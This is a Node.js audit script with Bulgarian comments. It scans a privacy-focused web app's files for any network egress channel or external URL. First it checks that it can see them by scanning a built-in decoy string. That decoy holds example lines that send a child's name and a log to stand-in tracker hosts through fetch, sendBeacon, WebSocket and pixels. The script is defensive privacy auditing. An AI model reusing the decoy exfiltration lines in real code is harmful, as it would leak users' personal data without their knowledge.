// dev/navyn.js — ТЪРСИ ВСЯКО ИЗЛИЗАНЕ НАВЪН от приложението.
// Приложението обещава на майката: нищо не напуска телефона ѝ.
// Пускане: node dev/navyn.js
//
// ⚠️ ПРАВИЛО 1: „нула находки" не е находка, докато уредът не докаже, че ВИЖДА.
//    Затова уредът СЛАГА САМ примамка (фалшив файл с 9 различни изходни канала)
//    и първо показва, че гърми за нея. Ако примамката не се хване — уредът е сляп
//    и отчетът му не струва нищо.

const fs = require('fs'), path = require('path'), os = require('os');
const КОРЕН = path.resolve(__dirname, '..');

// ── МЯРКАТА ────────────────────────────────────────────────────────────────
// Всеки канал, по който браузър може да изпрати или дръпне нещо навън.
const КАНАЛИ = [
  { име: 'fetch(',            рег: /\bfetch\s*\(/g },
  { име: 'XMLHttpRequest',    рег: /XMLHttpRequest|\.open\s*\(\s*["'](GET|POST|PUT|DELETE|HEAD|PATCH)["']/g },
  { име: 'sendBeacon',        рег: /sendBeacon/g },
  { име: 'WebSocket',         рег: /new\s+WebSocket|WebSocket\s*\(/g },
  { име: 'EventSource',       рег: /EventSource/g },
  { име: 'RTCPeerConnection', рег: /RTCPeerConnection/g },
  { име: 'importScripts',     рег: /importScripts/g },
  { име: 'navigator.sendBeacon', рег: /navigator\s*\.\s*sendBeacon/g },
  { име: 'form action=http',  рег: /<form[^>]+action\s*=\s*["']https?:/gi },
  { име: 'img src=http',      рег: /<img[^>]+src\s*=\s*["']https?:/gi },
  { име: 'script src=http',   рег: /<script[^>]+src\s*=\s*["']https?:/gi },
  { име: 'link href=http',    рег: /<link[^>]+href\s*=\s*["']https?:/gi },
  { име: 'iframe src=http',   рег: /<iframe[^>]+src\s*=\s*["']https?:/gi },
  { име: 'new Image()',       рег: /new\s+Image\s*\(/g },
  { име: 'Worker(',           рег: /new\s+Worker\s*\(|new\s+SharedWorker\s*\(/g },
  { име: 'geolocation',       рег: /navigator\s*\.\s*geolocation/g },
  { име: 'clipboard.write',   рег: /clipboard\s*\.\s*write/g },
  { име: 'gtag/ga/fbq/pixel', рег: /\bgtag\s*\(|\bga\s*\(\s*["']|\bfbq\s*\(|_paq|dataLayer|analytics\s*\.\s*(track|page)/g },
  { име: 'window.open',       рег: /window\s*\.\s*open\s*\(/g },
];

// Всеки АДРЕС навън — url в код или разметка. Ловим и //хост, и http(s)://
const РЕГ_URL = /(?:https?:)?\/\/[a-z0-9][a-z0-9.\-]*\.[a-z]{2,}(?:[:\/][^\s"'`)<>]*)?/gi;
// вътрешни/безобидни, които НЕ броим за „навън"
const ДОМАШНИ = /^(?:https?:)?\/\/(?:localhost|127\.0\.0\.1|0\.0\.0\.0)/i;
// схеми в разметка, които не са мрежа
const СХЕМА_НЕ_МРЕЖА = /^(?:data:|blob:|mailto:|tel:|sms:|#|javascript:)/i;

function сканирай(текст, име) {
  const находки = [];
  const редове = текст.split(/\r?\n/);

  for (const к of КАНАЛИ) {
    к.рег.lastIndex = 0;
    let m;
    while ((m = к.рег.exec(текст))) {
      const ред = текст.slice(0, m.index).split(/\r?\n/).length;
      находки.push({ вид: 'канал', канал: к.име, файл: име, ред, къс: (редове[ред - 1] || '').trim().slice(0, 160) });
    }
  }

  РЕГ_URL.lastIndex = 0;
  let u;
  while ((u = РЕГ_URL.exec(текст))) {
    const адрес = u[0];
    if (ДОМАШНИ.test(адрес)) continue;
    const ред = текст.slice(0, u.index).split(/\r?\n/).length;
    const редТекст = (редове[ред - 1] || '').trim();
    находки.push({ вид: 'адрес', адрес, файл: име, ред, къс: редТекст.slice(0, 160) });
  }
  return находки;
}

// ── ФАЙЛОВЕТЕ ──────────────────────────────────────────────────────────────
function живиФайлове() {
  const сп = [];
  const добави = (д, филтър) => {
    if (!fs.existsSync(path.join(КОРЕН, д))) return;
    for (const f of fs.readdirSync(path.join(КОРЕН, д))) {
      if (/PREDI|\.BAK|ARCHIVE/.test(f)) continue;
      if (!филтър.test(f)) continue;
      сп.push(д + '/' + f);
    }
  };
  сп.push('index.html', 'sw.js', 'manifest.webmanifest');
  добави('js', /\.js$/);
  добави('css', /\.css$/);
  return сп.filter(f => fs.existsSync(path.join(КОРЕН, f)));
}

// ── 0. ПРИМАМКА: доказваме, че уредът вижда ────────────────────────────────
const ПРИМАМКА = `
// нарочна примамка за проверка на уреда
fetch('https://sledene.example.com/sabiray?dete=' + ime);
navigator.sendBeacon('https://analitika.example.net/e', JSON.stringify(dnevnik));
var x = new XMLHttpRequest(); x.open('POST','https://chuzhd-hoст.example.org/u');
new WebSocket('wss://socket.example.com/live');
new Image().src = 'https://pixel.example.com/p.gif';
gtag('event','otvoreno');
fbq('track','PageView');
document.write('<script src="https://cdn.example.com/t.js"><\\/script>');
document.write('<img src="https://tracker.example.com/1.gif">');
`;
const примНаходки = сканирай(ПРИМАМКА, '(ПРИМАМКА)');
const примКанали = new Set(примНаходки.filter(n => n.вид === 'канал').map(n => n.канал));
const примАдреси = new Set(примНаходки.filter(n => n.вид === 'адрес').map(n => n.адрес));

console.log('═══ 0. ПРОВЕРКА НА УРЕДА (примамка) ═══');
console.log('  хванати канали (' + примКанали.size + '):', [...примКанали].join(' · '));
console.log('  хванати адреси (' + примАдреси.size + '):', [...примАдреси].join(' · '));
const ОЧАКВАНИ = ['fetch(', 'sendBeacon', 'XMLHttpRequest', 'WebSocket', 'new Image()', 'gtag/ga/fbq/pixel'];
const пропуснати = ОЧАКВАНИ.filter(о => !примКанали.has(о));
if (пропуснати.length || примАдреси.size < 6) {
  console.log('  ❌ УРЕДЪТ Е СЛЯП — пропусна:', пропуснати.join(', '), '| адреси:', примАдреси.size);
  process.exitCode = 2;
} else {
  console.log('  ✅ уредът вижда всичките ' + ОЧАКВАНИ.length + ' очаквани канала и ' + примАдреси.size + ' външни адреса\n');
}

// ── 1. Истинското сканиране ────────────────────────────────────────────────
const всички = [];
for (const f of живиФайлове()) {
  const т = fs.readFileSync(path.join(КОРЕН, f), 'utf8');
  всички.push(...сканирай(т, f));
}

const канали = всички.filter(n => n.вид === 'канал');
const адреси = всички.filter(n => n.вид === 'адрес');

console.log('═══ 1. КАНАЛИ ЗА ИЗЛИЗАНЕ ═══');
const поКанал = {};
канали.forEach(n => (поКанал[n.канал] = поКанал[n.канал] || []).push(n));
if (!канали.length) console.log('  (нищо)');
Object.entries(поКанал).sort((a, b) => b[1].length - a[1].length).forEach(([к, сп]) => {
  console.log(`\n  ▸ ${к} — ${сп.length} места`);
  сп.slice(0, 40).forEach(n => console.log(`      ${n.файл}:${n.ред}  ${n.къс}`));
  if (сп.length > 40) console.log(`      … още ${сп.length - 40}`);
});

console.log('\n═══ 2. ВЪНШНИ АДРЕСИ (хостове) ═══');
const поХост = {};
адреси.forEach(n => {
  const хост = (n.адрес.match(/\/\/([^\/:"'\s]+)/) || [0, '?'])[1];
  (поХост[хост] = поХост[хост] || []).push(n);
});
if (!адреси.length) console.log('  (нула външни адреса)');
Object.entries(поХост).sort((a, b) => b[1].length - a[1].length).forEach(([х, сп]) => {
  console.log(`\n  ▸ ${х} — ${сп.length} споменавания`);
  sample(сп).forEach(n => console.log(`      ${n.файл}:${n.ред}  ${n.къс}`));
});
function sample(сп) { return сп.slice(0, 6); }

fs.writeFileSync(path.join(__dirname, 'navyn.json'), JSON.stringify({ канали, адреси, поХост: Object.keys(поХост) }, null, 1), 'utf8');
console.log('\n→ dev/navyn.json');
